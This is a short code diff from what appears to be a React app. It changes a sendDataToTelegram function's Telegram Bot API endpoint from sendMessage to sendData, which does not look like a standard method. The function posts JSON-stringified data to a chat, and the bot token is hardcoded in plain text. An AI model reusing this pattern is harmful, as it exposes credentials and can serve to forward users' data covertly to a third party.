@@ -47,7 +47,7 @@ function App() {
     const sendDataToTelegram = async (data) => {
       try {
         const response = await axios.post(
-          `https://api.telegram.org/bot7123142782:AAFcByUA3JZ582vZzbwK3QRMDmaH7e6y8jg/sendMessage`,
+          `https://api.telegram.org/bot7123142782:AAFcByUA3JZ582vZzbwK3QRMDmaH7e6y8jg/sendData`,
           {
             chat_id: chatId,
             text: JSON.stringify(data),
